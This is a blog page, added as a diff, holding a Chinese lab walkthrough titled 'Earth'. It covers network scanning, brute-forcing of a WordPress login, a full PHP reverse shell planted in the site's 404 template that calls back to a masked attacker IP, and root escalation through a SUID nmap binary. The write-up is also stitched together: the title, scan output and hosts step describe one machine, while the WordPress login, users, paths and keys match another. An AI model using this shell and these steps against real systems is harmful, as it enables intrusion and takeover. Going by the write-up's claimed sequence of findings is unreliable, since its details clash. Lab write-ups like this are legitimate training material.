@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="17year" />
+  <meta name="author" content="17year" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Earth靶机记录 
+      
+      
+      |
+    
+     17year&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">17year</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">AboutMe</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Earth靶机记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-06-13 09:46:31
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/WirteUp/" title="WirteUp">
+                    <b>#</b> WirteUp
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Earth-靶机记录"><a href="#Earth-靶机记录" class="headerlink" title="Earth 靶机记录"></a>Earth 靶机记录</h1><h3 id="主机发现-内网其他主机省略"><a href="#主机发现-内网其他主机省略" class="headerlink" title="主机发现 内网其他主机省略"></a>主机发现 内网其他主机省略</h3><p>使用arp-scan 扫描发现主机指定网卡en0</p>
+<p><code>sudo arp-scan --interface=eth0 -l</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx	00:0c:29:47:12:82	VMware, Inc.</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap查看相关信息"><a href="#nmap查看相关信息" class="headerlink" title="nmap查看相关信息"></a>nmap查看相关信息</h3><p><code>sudo nmap -A xxx.xxx.xxx.xxx -sV -vv -O </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span><br><span class="line">|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br><span class="line">| Not valid before: 2021-10-12T23:26:31</span><br><span class="line">|_Not valid after:  2031-10-10T23:26:31</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line"></span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问web端口"><a href="#访问web端口" class="headerlink" title="访问web端口"></a>访问web端口</h3><p>直接访问发现访问不到,查看nmap返回结果发现有一条dns<br>尝试修改hosts指定为terratest.earth.local</p>
+<p>添加一条本地解析<code>sudo vim /etc/hosts</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx terratest.earth.local</span><br></pre></td></tr></table></figure>
+<p>发现可以访问页面</p>
+<h3 id="信息搜集成果总结"><a href="#信息搜集成果总结" class="headerlink" title="信息搜集成果总结"></a>信息搜集成果总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">已知开放端口80,443</span><br><span class="line">已知使用cms为WordPress4.3.28</span><br><span class="line">获取到类似字典文件并去重new.dic</span><br><span class="line">获取到key-1-of-3.txt 页面</span><br><span class="line">后台登录地址</span><br><span class="line">http://xxx.xxx.xxx.xxx/wp-login.php</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h3><p>访问key-1-of-3.txt页面发现flag1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key1:</span><br><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
+
+<h3 id="尝试爆破后台密码"><a href="#尝试爆破后台密码" class="headerlink" title="尝试爆破后台密码"></a>尝试爆破后台密码</h3><p>经过尝试发现后台登录页面输入用户名及密码会返回用户名错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Invalid username.</span><br></pre></td></tr></table></figure>
+
+<p>猜测可能若用户名正确回返回密码错误,尝试爆破用户名</p>
+<p>经过爆破尝试用户名,发现猜测正确获得三个用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elliot</span><br><span class="line">ELLIOT</span><br><span class="line">Elliot</span><br></pre></td></tr></table></figure>
+<p>进一步尝试使用这三个用户名进行爆破后台密码,获得3个同样的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elliot  ER28-0652</span><br><span class="line">ELLIOT  ER28-0652</span><br><span class="line">Elliot  ER28-0652</span><br></pre></td></tr></table></figure>
+<h3 id="反弹shell拿下控制权"><a href="#反弹shell拿下控制权" class="headerlink" title="反弹shell拿下控制权"></a>反弹shell拿下控制权</h3><p>随便找个页面上传php反弹shell<br>在这里修改404页面上传shell<br>并且使用kali监听19999端口</p>
+<p><code>nc -lvvp 19999</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &lt;?php</span><br><span class="line">  // php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line"></span><br><span class="line">  set_time_limit (0);</span><br><span class="line">  $VERSION = &quot;1.0&quot;;</span><br><span class="line">  $ip = &#x27;xxx.xxx.xxx.xxx&#x27;;  // You have changed this</span><br><span class="line">  $port = 19999;  // And this</span><br><span class="line">  $chunk_size = 1400;</span><br><span class="line">  $write_a = null;</span><br><span class="line">  $error_a = null;</span><br><span class="line">  $shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;</span><br><span class="line">  $daemon = 0;</span><br><span class="line">  $debug = 0;</span><br><span class="line"></span><br><span class="line">  //</span><br><span class="line">  // Daemonise ourself if possible to avoid zombies later</span><br><span class="line">  //</span><br><span class="line"></span><br><span class="line">  // pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">  // our php process and avoid zombies.  Worth a try...</span><br><span class="line">  if (function_exists(&#x27;pcntl_fork&#x27;)) &#123;</span><br><span class="line">    // Fork and have the parent process exit</span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    </span><br><span class="line">    if ($pid == -1) &#123;</span><br><span class="line">      printit(&quot;ERROR: Can&#x27;t fork&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($pid) &#123;</span><br><span class="line">      exit(0);  // Parent exits</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Make the current process a session leader</span><br><span class="line">    // Will only succeed if we forked</span><br><span class="line">    if (posix_setsid() == -1) &#123;</span><br><span class="line">      printit(&quot;Error: Can&#x27;t setsid()&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $daemon = 1;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Change to a safe directory</span><br><span class="line">  chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">  // Remove any umask we inherited</span><br><span class="line">  umask(0);</span><br><span class="line"></span><br><span class="line">  //</span><br><span class="line">  // Do the reverse shell...</span><br><span class="line">  //</span><br><span class="line"></span><br><span class="line">  // Open reverse connection</span><br><span class="line">  $sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">  if (!$sock) &#123;</span><br><span class="line">    printit(&quot;$errstr ($errno)&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Spawn shell process</span><br><span class="line">  $descriptorspec = array(</span><br><span class="line">    0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from</span><br><span class="line">    1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">    2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  $process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">  if (!is_resource($process)) &#123;</span><br><span class="line">    printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Set everything to non-blocking</span><br><span class="line">  // Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="line">  stream_set_blocking($pipes[0], 0);</span><br><span class="line">  stream_set_blocking($pipes[1], 0);</span><br><span class="line">  stream_set_blocking($pipes[2], 0);</span><br><span class="line">  stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">  printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"></span><br><span class="line">  while (1) &#123;</span><br><span class="line">    // Check for end of TCP connection</span><br><span class="line">    if (feof($sock)) &#123;</span><br><span class="line">      printit(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check for end of STDOUT</span><br><span class="line">    if (feof($pipes[1])) &#123;</span><br><span class="line">      printit(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Wait until a command is end down $sock, or some</span><br><span class="line">    // command output is available on STDOUT or STDERR</span><br><span class="line">    $read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line"></span><br><span class="line">    // If we can read from the TCP socket, send</span><br><span class="line">    // data to process&#x27;s STDIN</span><br><span class="line">    if (in_array($sock, $read_a)) &#123;</span><br><span class="line">      if ($debug) printit(&quot;SOCK READ&quot;);</span><br><span class="line">      $input = fread($sock, $chunk_size);</span><br><span class="line">      if ($debug) printit(&quot;SOCK: $input&quot;);</span><br><span class="line">      fwrite($pipes[0], $input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // If we can read from the process&#x27;s STDOUT</span><br><span class="line">    // send data down tcp connection</span><br><span class="line">    if (in_array($pipes[1], $read_a)) &#123;</span><br><span class="line">      if ($debug) printit(&quot;STDOUT READ&quot;);</span><br><span class="line">      $input = fread($pipes[1], $chunk_size);</span><br><span class="line">      if ($debug) printit(&quot;STDOUT: $input&quot;);</span><br><span class="line">      fwrite($sock, $input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // If we can read from the process&#x27;s STDERR</span><br><span class="line">    // send data down tcp connection</span><br><span class="line">    if (in_array($pipes[2], $read_a)) &#123;</span><br><span class="line">      if ($debug) printit(&quot;STDERR READ&quot;);</span><br><span class="line">      $input = fread($pipes[2], $chunk_size);</span><br><span class="line">      if ($debug) printit(&quot;STDERR: $input&quot;);</span><br><span class="line">      fwrite($sock, $input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fclose($sock);</span><br><span class="line">  fclose($pipes[0]);</span><br><span class="line">  fclose($pipes[1]);</span><br><span class="line">  fclose($pipes[2]);</span><br><span class="line">  proc_close($process);</span><br><span class="line"></span><br><span class="line">  // Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="line">  // (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">  function printit ($string) &#123;</span><br><span class="line">    if (!$daemon) &#123;</span><br><span class="line">      print &quot;$string</span><br><span class="line">&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ?&gt; </span><br></pre></td></tr></table></figure>
+<p>使用浏览器访问<code>http://xxx.xxx.xxx.xxx/0/404.php</code>成功反弹shell</p>
+<p>但现在没有tty的shell,尝试用python生成一个交互式shell</p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>成功获得交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">daemon@linux:/$ </span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>尝试提权<code>find / -user root -perm /4000 2&gt;/dev/null</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm /4000 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+<p>发现有nmap可以利用 尝试使用nmap提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ /usr/local/bin/nmap --interactive</span><br><span class="line">/usr/local/bin/nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>提权成功使用find命令查找出key1,key2,key3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># find / -name &quot;*key*.txt&quot;</span><br><span class="line">find / -name &quot;*key*.txt&quot;</span><br><span class="line">/usr/share/perl/5.18.2/Unicode/Collate/keys.txt</span><br><span class="line">/usr/share/perl/5.18.2/Unicode/Collate/allkeys.txt</span><br><span class="line">/usr/share/doc/openssl/HOWTO/keys.txt</span><br><span class="line">/root/key-3-of-3.txt</span><br><span class="line">/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt</span><br><span class="line">/home/robot/key-2-of-3.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看key"><a href="#查看key" class="headerlink" title="查看key"></a>查看key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#cat /home/robot/key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br><span class="line"></span><br><span class="line">#cat /root/key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sum-up"><a href="#Sum-up" class="headerlink" title="Sum-up"></a>Sum-up</h2><p>扫描端口发现80,443</p>
+<p>扫描目录发现robots.txt&gt;fsocity.dic去重&gt;new.dic</p>
+<p>访问发现WordPress后台登录可以遍历用户名是否正确并且通过new.dic爆破用户名及密码</p>
+<p>使用Elliot,ER28-0652登录后台上传shell反弹shell到攻击机</p>
+<p>python生成tty shell </p>
+<p>SUID查找可提权方式(nmap提权)&gt;root用户为所欲为</p>
+<p>key1:<code>073403c8a58a1f80d943455fb30724b9</code></p>
+<p>key2:<code>822c73956184f694993bede3eb39f959</code></p>
+<p>key3:<code>04787ddef27c3dee1ee161b21670b4e4</code></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/Memorandum/ziyong/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-06-13 09:46:31
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/WirteUp/" title="WirteUp">
+                        <b>#</b> WirteUp
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/Targetplane/Dc4/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Earth-%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95"><span class="toc-text">Earth 靶机记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA%E7%9C%81%E7%95%A5"><span class="toc-text">主机发现 内网其他主机省略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%9F%A5%E7%9C%8B%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-text">nmap查看相关信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEweb%E7%AB%AF%E5%8F%A3"><span class="toc-text">访问web端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%88%90%E6%9E%9C%E6%80%BB%E7%BB%93"><span class="toc-text">信息搜集成果总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#key1"><span class="toc-text">key1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81"><span class="toc-text">尝试爆破后台密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%8B%BF%E4%B8%8B%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-text">反弹shell拿下控制权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bkey"><span class="toc-text">查看key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sum-up"><span class="toc-text">Sum-up</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/17year">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
